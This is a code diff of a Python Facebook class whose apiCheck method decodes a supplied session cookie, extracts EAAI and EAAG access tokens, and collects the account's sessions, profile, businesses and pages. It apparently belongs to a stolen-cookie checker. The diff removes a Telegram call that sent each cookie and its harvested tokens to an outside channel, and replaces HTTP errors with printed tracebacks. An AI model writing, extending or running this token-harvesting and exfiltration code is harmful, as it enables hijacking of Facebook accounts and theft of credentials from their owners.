@@ -1,12 +1,11 @@
 
-from fastapi import HTTPException
+import traceback
 from urllib.parse import unquote
 import base64
 import json
 import random
 import re
 import requests
-from core.telegram import Telegram
 
 
 class Facebook:
@@ -19,7 +18,6 @@ class Facebook:
         self.FACEBOOK_BASE_M = 'https://m.facebook.com'
         self.FACEBOOK_BASE_WWW = 'https://www.facebook.com'
         self.FACEBOOK_BASE_BM = 'https://business.facebook.com'
-        self.TELEGRAM = Telegram()
 
     def apiCheck(self, cookieEncode):
         try:
@@ -31,15 +29,15 @@ class Facebook:
 
             fbUID = self.apiGetUidFromCookie(cookie)
             if fbUID is None:
-                raise HTTPException(status_code=404)
+                return None
 
             EAAI = self.apiGetTokenEAAI(api)
             if EAAI is None:
-                raise HTTPException(status_code=404)
+                return None
 
             EAAG = self.apiGetTokenEAAG(api)
             if EAAG is None:
-                raise HTTPException(status_code=404)
+                return None
 
             sessions = self.apiGetSessions(api)
             me = self.apiGetMe(api, EAAG)
@@ -47,7 +45,7 @@ class Facebook:
             businesses = self.apiGetBusinesses(api, EAAG)
             pages = self.apiGetFacebookPages(api, EAAG)
 
-            values = {
+            return {
                 'EAAI': EAAI,
                 'EAAG': EAAG,
                 'sessions': sessions,
@@ -56,13 +54,11 @@ class Facebook:
                 'businesses': businesses,
                 'pages': pages
             }
-
-            self.TELEGRAM.apiSendMessage(cookie, values)
-            return values
         except requests.exceptions.ConnectionError:
             return self.apiCheck(cookieEncode)
-        except Exception:
-            raise HTTPException(status_code=403)
+        except:
+            print(traceback.format_exc())
+            return None
 
     def apiDecodeBase64(self, encode):
         return base64.b64decode(encode.encode('utf-8')).decode('utf-8')
